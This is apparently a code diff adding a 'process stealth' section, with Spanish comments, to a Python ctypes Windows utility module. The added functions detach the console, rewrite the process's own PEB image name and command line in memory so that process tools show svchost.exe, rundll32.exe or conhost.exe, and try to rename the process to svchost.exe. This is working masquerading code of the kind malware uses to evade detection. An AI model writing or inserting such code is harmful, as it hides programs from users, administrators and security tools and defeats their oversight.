@@ -1,9 +1,22 @@
 import ctypes
+import os
+import struct
+import sys
 from ctypes import wintypes
 
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
 dwmapi = ctypes.windll.dwmapi
+
+ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+
+ntdll.NtQueryInformationProcess.restype = ctypes.c_long
+ntdll.NtQueryInformationProcess.argtypes = [
+    wintypes.HANDLE, ctypes.c_ulong, ctypes.c_void_p,
+    ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
+]
+ProcessBasicInformation = 0
+ProcessWow64Information = 0x1A
 
 DWMWA_TRANSITIONS_FORCEDISABLED = 3
 
@@ -235,3 +248,342 @@ def is_hotkey_message(msg) -> bool:
         return msg.message == WM_HOTKEY
     except Exception:
         return False
+
+
+# ---------------------------------------------------------------------------
+#  STEALTH DE PROCESO
+# ---------------------------------------------------------------------------
+
+GetCurrentProcess = kernel32.GetCurrentProcess
+GetCurrentProcess.restype = wintypes.HANDLE
+
+CloseHandle = kernel32.CloseHandle
+CloseHandle.argtypes = [wintypes.HANDLE]
+CloseHandle.restype = wintypes.BOOL
+
+ReadProcessMemory = kernel32.ReadProcessMemory
+ReadProcessMemory.argtypes = [
+    wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID,
+    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t),
+]
+ReadProcessMemory.restype = wintypes.BOOL
+
+WriteProcessMemory = kernel32.WriteProcessMemory
+WriteProcessMemory.argtypes = [
+    wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID,
+    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t),
+]
+WriteProcessMemory.restype = wintypes.BOOL
+
+FreeConsole = kernel32.FreeConsole
+FreeConsole.argtypes = []
+FreeConsole.restype = wintypes.BOOL
+
+IsWow64Process = kernel32.IsWow64Process
+IsWow64Process.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.BOOL)]
+IsWow64Process.restype = wintypes.BOOL
+
+_set_process_name_w = None
+
+
+def _try_set_process_name(name: str) -> bool:
+    """Intenta renombrar el proceso. SetProcessNameW no existe en kernel32,
+    por lo que se busca la API por nombre solo de forma opcional y segura."""
+    global _set_process_name_w
+    try:
+        if _set_process_name_w is None:
+            _set_process_name_w = getattr(kernel32, "SetProcessNameW", None)
+            if _set_process_name_w is None:
+                return False
+            _set_process_name_w.argtypes = [wintypes.LPCWSTR]
+            _set_process_name_w.restype = wintypes.BOOL
+        if _set_process_name_w:
+            return bool(_set_process_name_w(name))
+    except Exception:
+        pass
+    return False
+
+
+def _is_wow64() -> bool:
+    """True si el proceso Python es de 32 bits ejecutandose en 64."""
+    result = wintypes.BOOL(False)
+    IsWow64Process(GetCurrentProcess(), ctypes.byref(result))
+    return bool(result)
+
+
+def _get_peb_address() -> int:
+    """Obtiene la direccion base del PEB del proceso actual."""
+    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
+        _fields_ = [
+            ("Reserved1", ctypes.c_void_p),
+            ("PebBaseAddress", ctypes.c_void_p),
+            ("Reserved2", ctypes.c_void_p * 2),
+            ("UniqueProcessId", wintypes.ULONG),
+            ("Reserved3", ctypes.c_void_p),
+        ]
+
+    pbi = PROCESS_BASIC_INFORMATION()
+    ret_len = wintypes.ULONG(0)
+    status = ntdll.NtQueryInformationProcess(
+        GetCurrentProcess(),
+        ProcessBasicInformation,
+        ctypes.byref(pbi),
+        ctypes.sizeof(pbi),
+        ctypes.byref(ret_len),
+    )
+    if status >= 0 and pbi.PebBaseAddress:
+        return ctypes.cast(pbi.PebBaseAddress, ctypes.c_void_p).value
+    return 0
+
+
+def _read_memory(address: int, size: int) -> bytes:
+    """Lee memoria del proceso actual."""
+    buf = ctypes.create_string_buffer(size)
+    bytes_read = ctypes.c_size_t(0)
+    result = ReadProcessMemory(
+        GetCurrentProcess(),
+        ctypes.c_void_p(address),
+        buf,
+        size,
+        ctypes.byref(bytes_read),
+    )
+    if not result:
+        return b""
+    return buf.raw[: bytes_read.value]
+
+
+def _write_memory(address: int, data: bytes) -> bool:
+    """Escribe memoria del proceso actual."""
+    buf = ctypes.create_string_buffer(data)
+    bytes_written = ctypes.c_size_t(0)
+    result = WriteProcessMemory(
+        GetCurrentProcess(),
+        ctypes.c_void_p(address),
+        buf,
+        len(data),
+        ctypes.byref(bytes_written),
+    )
+    return bool(result)
+
+
+def _spoof_peb_name() -> bool:
+    """
+    Modifica el ImagePathName en el PEB del proceso para que las herramientas
+    de depuracion y procesos muestren un nombre generico en lugar del real.
+    """
+    if _is_wow64():
+        return False
+
+    try:
+        peb = _get_peb_address()
+        if not peb:
+            return False
+
+        ptr_size = 8
+
+        ldr_offset = peb + 0x18
+        ldr_data = struct.unpack("<Q", _read_memory(ldr_offset, ptr_size))[0]
+        if not ldr_data:
+            return False
+
+        in_load_order_offset = ldr_data + 0x10
+        first_entry = struct.unpack("<Q", _read_memory(in_load_order_offset, ptr_size))[0]
+        if not first_entry:
+            return False
+
+        dll_base_offset = first_entry + 0x30
+        full_dll_name_offset = first_entry + 0x48
+
+        _read_memory(dll_base_offset, ptr_size)
+
+        name_unicode_offset = full_dll_name_offset
+        name_unicode = _read_memory(name_unicode_offset, 16)
+        if not name_unicode or len(name_unicode) < 16:
+            return False
+
+        if ptr_size == 8:
+            name_len = struct.unpack("<H", name_unicode[0:2])[0]
+            name_max = struct.unpack("<H", name_unicode[2:4])[0]
+            name_buf_ptr = struct.unpack("<Q", name_unicode[8:16])[0]
+        else:
+            name_len = struct.unpack("<H", name_unicode[0:2])[0]
+            name_max = struct.unpack("<H", name_unicode[2:4])[0]
+            name_buf_ptr = struct.unpack("<I", name_unicode[8:12])[0]
+
+        if not name_buf_ptr or name_len == 0:
+            return False
+
+        spoof_candidates = [
+            "\\Windows\\System32\\svchost.exe",
+            "\\Windows\\svchost.exe",
+            "svchost.exe",
+            "rundll32.exe",
+            "conhost.exe",
+        ]
+        spoofed_name = None
+        for candidate in spoof_candidates:
+            if len(candidate.encode("utf-16-le")) + 2 <= name_max:
+                spoofed_name = candidate
+                break
+        if spoofed_name is None:
+            return False
+
+        spoofed_bytes = spoofed_name.encode("utf-16-le")
+
+        _write_memory(name_buf_ptr, spoofed_bytes + b"\x00\x00")
+
+        if len(spoofed_bytes) < name_len:
+            _write_memory(
+                name_buf_ptr + len(spoofed_bytes),
+                b"\x00\x00" * ((name_len - len(spoofed_bytes)) // 2),
+            )
+
+        new_len = len(spoofed_bytes)
+        _write_memory(name_unicode_offset, struct.pack("<HH", new_len, name_max))
+
+        return True
+    except Exception:
+        return False
+
+
+def _spoof_peb_commandline() -> bool:
+    """
+    Modifica el CommandLine en el PEB del proceso para ocultar los argumentos
+    reales de lanzamiento y mostrar uno generico de Windows.
+
+    El offset del campo CommandLine varia entre versiones de Windows, por lo
+    que se localiza dinamicamente comparando con GetCommandLineW().
+    """
+    if _is_wow64():
+        return False
+
+    try:
+        peb = _get_peb_address()
+        if not peb:
+            return False
+
+        ptr_size = 8
+
+        GetCommandLineW = kernel32.GetCommandLineW
+        GetCommandLineW.restype = ctypes.c_void_p
+        real_cmd_ptr = GetCommandLineW()
+        if not real_cmd_ptr:
+            return False
+
+        process_parameters = struct.unpack(
+            "<Q", _read_memory(peb + 0x20, ptr_size)
+        )[0]
+        if not process_parameters:
+            return False
+
+        commandline_offset = 0
+        cmd_len = 0
+        cmd_max = 0
+        cmd_buf_ptr = 0
+
+        for candidate in range(0x38, 0x160, 8):
+            chunk = _read_memory(process_parameters + candidate, 16)
+            if not chunk or len(chunk) < 16:
+                continue
+            candidate_len, candidate_max = struct.unpack("<HH", chunk[0:4])
+            candidate_buf = struct.unpack("<Q", chunk[8:16])[0]
+            if (
+                0 < candidate_len <= candidate_max <= 65536
+                and candidate_buf == real_cmd_ptr
+            ):
+                commandline_offset = candidate
+                cmd_len = candidate_len
+                cmd_max = candidate_max
+                cmd_buf_ptr = candidate_buf
+                break
+
+        if not commandline_offset or not cmd_buf_ptr or cmd_len == 0:
+            return False
+
+        spoof_candidates = [
+            "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+            "C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted",
+            "svchost.exe -k netsvcs -p",
+            "C:\\Windows\\System32\\rundll32.exe",
+        ]
+        spoofed = None
+        for candidate in spoof_candidates:
+            if len(candidate.encode("utf-16-le")) + 2 <= cmd_max:
+                spoofed = candidate
+                break
+        if spoofed is None:
+            spoofed = "svchost.exe -k"
+            if len(spoofed.encode("utf-16-le")) + 2 > cmd_max:
+                return False
+
+        spoofed_bytes = spoofed.encode("utf-16-le")
+
+        _write_memory(cmd_buf_ptr, spoofed_bytes + b"\x00\x00")
+
+        if len(spoofed_bytes) < cmd_len:
+            _write_memory(
+                cmd_buf_ptr + len(spoofed_bytes),
+                b"\x00\x00" * ((cmd_len - len(spoofed_bytes)) // 2),
+            )
+
+        _write_memory(
+            process_parameters + commandline_offset,
+            struct.pack("<HH", len(spoofed_bytes), cmd_max),
+        )
+
+        return True
+    except Exception:
+        return False
+
+
+def detach_console() -> bool:
+    """Desacopla la consola del proceso para que no aparezca como consola."""
+    try:
+        return bool(FreeConsole())
+    except Exception:
+        return False
+
+
+def hide_from_processes() -> bool:
+    """
+    Aplica tecnicas de stealth a nivel de proceso:
+    - Oculta la consola
+    - Renombra el proceso a un nombre generico de Windows
+    - Modifica el nombre en el PEB
+    """
+    ok = True
+
+    ok = detach_console() or ok
+
+    _try_set_process_name("svchost.exe")
+
+    try:
+        if _spoof_peb_name():
+            ok = True
+    except Exception:
+        pass
+
+    return ok
+
+
+def spoof_process_visibility() -> bool:
+    """
+    Cambia lo que se ve del proceso en herramientas externas.
+    Retorna True si al menos una tecnica funciono.
+    """
+    ok = False
+    try:
+        if _spoof_peb_name():
+            ok = True
+    except Exception:
+        pass
+
+    try:
+        if _spoof_peb_commandline():
+            ok = True
+    except Exception:
+        pass
+
+    _try_set_process_name("svchost.exe")
+
+    return ok
